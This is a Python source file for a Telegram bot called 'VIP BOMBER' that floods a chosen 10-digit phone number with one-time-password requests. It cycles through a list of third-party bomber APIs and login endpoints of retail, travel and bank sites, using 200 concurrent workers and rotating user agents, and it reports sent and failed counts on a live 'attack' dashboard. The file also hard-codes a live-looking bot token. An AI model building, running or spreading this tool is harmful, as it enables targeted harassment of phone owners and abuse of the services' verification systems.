import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
import asyncio
import aiohttp
import random
import os
from flask import Flask

# ==========================================
# ⚙️ SECURE CONFIGURATION
# ==========================================
TOKEN = '8339566385:AAGVLMNGzyYLAMQanpQPL42w3mD7NqoZJc4'
OWNER_ID = 8448533037

# 👑 VIP BRANDING
BRAND = "@frexxxy"
ADMIN_USER = "@frexxxy"

# 🛑 FORCE JOIN CHANNELS (BOT MUST BE ADMIN HERE)
REQUIRED_CHANNELS = [
    "@frexyy_Era", 
    "@frexyyEra"
]

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
active_attacks = {}

# ==========================================
# 🌐 FLASK WEB SERVER (FOR RENDER HOSTING)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "<b>FREXXY VIP BOMBER IS ALIVE AND RUNNING!</b>"

def run_server():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = threading.Thread(target=run_server)
    t.daemon = True
    t.start()

# ==========================================
# 🧹 AUTO-CLEANER ENGINE
# ==========================================
def clean_msg(chat_id, msg_id, delay=15):
    def delete():
        time.sleep(delay)
        try:
            bot.delete_message(chat_id, msg_id)
        except:
            pass
    threading.Thread(target=delete).start()

# ==========================================
# 🛡️ STRICT FORCE JOIN CHECKER
# ==========================================
def check_join_status(user_id):
    if user_id == OWNER_ID: return True 
    for chat_id in REQUIRED_CHANNELS:
        try:
            status = bot.get_chat_member(chat_id, user_id).status
            if status not in ['member', 'administrator', 'creator']:
                return False
        except Exception:
            return False
    return True

def force_join_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Join Main Channel", url="https://t.me/frexyy_Era"),
        InlineKeyboardButton("📢 Join Second Channel", url="https://t.me/frexyyEra"),
        InlineKeyboardButton("✅ VERIFY MY JOIN ✅", callback_data="verify_join")
    )
    return markup

# ==========================================
# 💣 FULL WORKING APIs (HIGH SPEED)
# ==========================================
WORKING_APIS = [
    "https://panther-aura-bomber-999-blond.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://pantherbomberjs.pantherxofficial1.workers.dev/api?num={phone}&type=sms&workers=500",
    "https://mix-rootx-new.vercel.app/bomb?number={phone}&workers=500",
    "https://panther-v2-api.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://panther-x2.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://lakhan-api-bom.hb3284008.workers.dev/?phone={phone}&workers=5000",
    "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar={phone}&workers=5000",
    "https://www.gopinkcabs.com/app/cab/customer/login_admin_code?mobile={phone}",
    "https://www.haldiram.com/api/v2/otp/send?mobile={phone}",
    "https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp?mobile={phone}",
    "https://api.healthmug.com/account/createotp?mobile={phone}",
    "https://homedeliverybackend.mpaani.com/auth/send-otp?mobile={phone}",
    "https://hometriangle.com/api/partner/xauth/signup/otp?mobile={phone}",
    "https://login.housing.com/api/v2/send-otp?mobile={phone}",
    "https://kukufm.com/api/v2/send_otp/?phone={phone}",
    "https://auth.mamaearth.in/v1/auth/initiate-signup?phone={phone}",
    "https://www.nobroker.in/api/v3/account/otp/send?mobile={phone}",
    "https://www.nykaa.com/app-api/index.php/customer/send_otp?mobile={phone}",
    "https://api.rapido.bike/apigw/v1/send-otp?phone={phone}",
    "https://api.swiggy.com/3/auth/otp?mobile={phone}",
    "https://www.tatacliq.com/api/auth/v1/otp/send?mobile={phone}",
    "https://www.urbancompany.com/api/v1/auth/otp?phone={phone}",
    "https://www.zomato.com/webroutes/auth/otp?phone={phone}",
    "https://www.flipkart.com/api/5/user/otp/generate?phone={phone}",
    "https://www.meesho.com/api/auth/otp?phone={phone}",
    "https://www.phonepe.com/api/otp?phone={phone}",
    "https://www.mobikwik.com/api/otp?phone={phone}",
    "https://www.cred.com/api/otp?phone={phone}",
    "https://www.hotstar.com/api/otp?phone={phone}",
    "https://www.sonyliv.com/api/otp?phone={phone}",
    "https://www.irctc.co.in/api/otp?mobile={phone}",
    "https://www.goibibo.com/api/otp?phone={phone}",
    "https://www.uber.com/api/otp?phone={phone}",
    "https://www.olacabs.com/api/otp?phone={phone}",
    "https://www.dominos.co.in/api/otp?phone={phone}",
    "https://www.pizzahut.co.in/api/otp?phone={phone}",
    "https://www.sbi.co.in/api/otp?mobile={phone}",
    "https://www.hdfcbank.com/api/otp?mobile={phone}",
    "https://www.icicibank.com/api/otp?mobile={phone}",
    "https://www.axisbank.com/api/otp?mobile={phone}",
    "https://www.kotak.com/api/otp?mobile={phone}"
]

user_agents = [
    "Mozilla/5.0 (Linux; Android 14; SM-S918B)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

def get_headers(is_post=False):
    h = {'User-Agent': random.choice(user_agents)}
    if is_post: h['Content-Type'] = 'application/json'
    return h

# ==========================================
# ⚡ ASYNC ATTACK ENGINE 
# ==========================================
async def attack_worker(session, phone, user_id):
    global active_attacks
    while active_attacks.get(user_id, {}).get('running', False):
        api_url = random.choice(WORKING_APIS)
        url = api_url.replace("{phone}", phone)
        is_post = not any(x in api_url for x in ["panther", "bomber", "workers", "vercel", "lakhan"])
        
        try:
            if is_post:
                async with session.post(url, headers=get_headers(True), timeout=4, ssl=False) as res:
                    if res.status in [200, 201, 202, 204]: active_attacks[user_id]['sent'] += 1
                    else: active_attacks[user_id]['failed'] += 1
            else:
                async with session.get(url, headers=get_headers(False), timeout=4, ssl=False) as res:
                    if res.status in [200, 201, 202, 204]: active_attacks[user_id]['sent'] += 1
                    else: active_attacks[user_id]['failed'] += 1
        except:
            active_attacks[user_id]['failed'] += 1
        
        await asyncio.sleep(0.05)

async def launch_async_attack(phone, workers_count, user_id):
    connector = aiohttp.TCPConnector(limit=workers_count)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(attack_worker(session, phone, user_id)) for _ in range(workers_count)]
        while active_attacks.get(user_id, {}).get('running', False):
            await asyncio.sleep(1)
        for t in tasks: t.cancel()

def start_attack_thread(phone, user_id, chat_id, msg_id):
    active_attacks[user_id] = {'running': True, 'sent': 0, 'failed': 0, 'phone': phone}
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    threading.Thread(target=live_update_msg, args=(user_id, chat_id, msg_id)).start()
    loop.run_until_complete(launch_async_attack(phone, 200, user_id))
    loop.close()

# ==========================================
# 📊 PREMIUM LIVE DASHBOARD
# ==========================================
def get_progress_bar(sent, total=500):
    percent = min(int((sent / total) * 10), 10)
    bar = '█' * percent + '░' * (10 - percent)
    return bar

def live_update_msg(user_id, chat_id, msg_id):
    start_time = time.time()
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 STOP ATTACK 🛑", callback_data=f"stop_{user_id}"))
    
    while active_attacks.get(user_id, {}).get('running', False):
        time.sleep(2.5) 
        if not active_attacks.get(user_id, {}).get('running', False): break
        
        elapsed = int(time.time() - start_time)
        mins, secs = divmod(elapsed, 60)
        sent = active_attacks[user_id]['sent']
        failed = active_attacks[user_id]['failed']
        
        text = (
            f"<b>🔥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗜𝗦 𝗥𝗨𝗡𝗡𝗜𝗡𝗚...</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>🎯 𝗧𝗔𝗥𝗚𝗘𝗧 :</b> <code>{active_attacks[user_id]['phone']}</code>\n"
            f"<b>⏱️ 𝗧𝗜𝗠𝗘   :</b> <code>{mins:02d}:{secs:02d}</code>\n"
            f"<b>📊 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦:</b> [ {get_progress_bar(sent)} ]\n\n"
            f"<b>✅ 𝗦𝗘𝗡𝗧   :</b> <code>{sent}</code>\n"
            f"<b>❌ 𝗙𝗔𝗜𝗟𝗘𝗗 :</b> <code>{failed}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>👑 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆:\n{BRAND}</b>"
        )
        try:
            bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup)
        except: pass

# ==========================================
# 🎮 VIP BOT UI & COMMANDS
# ==========================================
@bot.message_handler(commands=['start'])
def send_welcome(m):
    user_id = m.from_user.id
    clean_msg(m.chat.id, m.message_id, 15)
    
    if not check_join_status(user_id):
        text = (
            f"<b>⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Hello <code>{m.from_user.first_name}</code>, you must join our official channels to use this bot.\n\n"
            f"<i>1. Click buttons below to join.\n2. Click 'VERIFY MY JOIN' to use the bot.</i>\n\n"
            f"<b>⚡ Powered By: {BRAND}</b>"
        )
        msg = bot.send_message(m.chat.id, text, reply_markup=force_join_markup())
        clean_msg(m.chat.id, msg.message_id, 15)
        return

    show_main_panel(m.chat.id, m.from_user.first_name)

def show_main_panel(chat_id, name):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 START ATTACK", callback_data="ask_number"),
        InlineKeyboardButton("👤 MY PROFILE", callback_data="profile")
    )
    markup.add(InlineKeyboardButton("🛡️ CONTACT ADMIN", url=f"https://t.me/{ADMIN_USER[1:]}"))
    
    text = (
        f"<b>✦ ━━━━━━━━━━━━━━━━━━━━ ✦</b>\n"
        f"<b>   🔥 𝗩𝗜𝗣 𝗕𝗢𝗠𝗕𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 🔥   </b>\n"
        f"<b>✦ ━━━━━━━━━━━━━━━━━━━━ ✦</b>\n"
        f"<b>Welcome back,</b> <code>{name}</code>\n\n"
        f"<i>Access Granted. Click 'START ATTACK' to begin.</i>\n\n"
        f"<b>👑 Powered By:\n{BRAND}</b>"
    )
    msg = bot.send_message(chat_id, text, reply_markup=markup)
    clean_msg(chat_id, msg.message_id, 15)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    
    if call.data == "verify_join":
        if check_join_status(user_id):
            bot.delete_message(chat_id, msg_id)
            bot.answer_callback_query(call.id, "✅ Access Granted! Welcome.", show_alert=False)
            show_main_panel(chat_id, call.from_user.first_name)
        else:
            bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)

    elif call.data == "ask_number":
        if not check_join_status(user_id):
            return bot.answer_callback_query(call.id, "❌ Verification lost. Please send /start again.", show_alert=True)
            
        if active_attacks.get(user_id, {}).get('running', False):
            return bot.answer_callback_query(call.id, "⚠️ Please stop your running attack first!", show_alert=True)
            
        msg = bot.send_message(chat_id, "<b>📞 𝗘𝗡𝗧𝗘𝗥 𝗧𝗔𝗥𝗚𝗘𝗧 (𝟭𝟬-𝗗𝗶𝗴𝗶𝘁𝘀):</b>\n<i>Reply to this message with the target number.</i>")
        clean_msg(chat_id, msg.message_id, 15)
        bot.register_next_step_handler(msg, process_target)
        bot.answer_callback_query(call.id)
        
    elif call.data == "profile":
        bot.answer_callback_query(call.id, f"👤 USER ID: {user_id}\n👑 STATUS: VIP USER\n🛡️ Admin: {ADMIN_USER}", show_alert=True)
        
    elif call.data.startswith("stop_"):
        target_uid = int(call.data.split("_")[1])
        if user_id != target_uid and user_id != OWNER_ID:
            return bot.answer_callback_query(call.id, "❌ You cannot stop someone else's attack!", show_alert=True)
            
        if active_attacks.get(target_uid, {}).get('running', False):
            active_attacks[target_uid]['running'] = False
            bot.answer_callback_query(call.id, "🛑 Stopping Attack...", show_alert=True)
            
            sent = active_attacks[target_uid]['sent']
            failed = active_attacks[target_uid]['failed']
            
            final_text = (
                f"<b>🛑 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣𝗣𝗘𝗗</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b>🎯 𝗧𝗔𝗥𝗚𝗘𝗧 :</b> <code>{active_attacks[target_uid]['phone']}</code>\n"
                f"<b>✅ 𝗧𝗢𝗧𝗔𝗟 𝗦𝗘𝗡𝗧   :</b> <code>{sent}</code>\n"
                f"<b>❌ 𝗧𝗢𝗧𝗔𝗟 𝗙𝗔𝗜𝗟𝗘𝗗 :</b> <code>{failed}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<b>👑 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆:\n{BRAND}</b>"
            )
            bot.edit_message_text(final_text, chat_id, msg_id)
            clean_msg(chat_id, msg_id, 10) 
        else:
            bot.answer_callback_query(call.id, "⚠️ Attack is already stopped.", show_alert=True)

def process_target(m):
    user_id = m.from_user.id
    phone = m.text.strip()
    
    clean_msg(m.chat.id, m.message_id, 15)
    
    if not phone.isdigit() or len(phone) != 10:
        err = bot.reply_to(m, "<b>❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗡𝘂𝗺𝗯𝗲𝗿!</b> Must be 10 digits.")
        clean_msg(m.chat.id, err.message_id, 10) 
        return
        
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🛑 STOP ATTACK 🛑", callback_data=f"stop_{user_id}"))
    
    status_msg = bot.send_message(m.chat.id, "<b>⏳ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸...</b>", reply_markup=markup)
    threading.Thread(target=start_attack_thread, args=(phone, user_id, m.chat.id, status_msg.message_id)).start()

if __name__ == "__main__":
    # 🌐 START FLASK WEB SERVER FOR RENDER
    keep_alive()
    print(f"✅ SYSTEM ONLINE AND WEB SERVER RUNNING!")
    print(f"👑 Powered By: {BRAND}")
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            time.sleep(2)
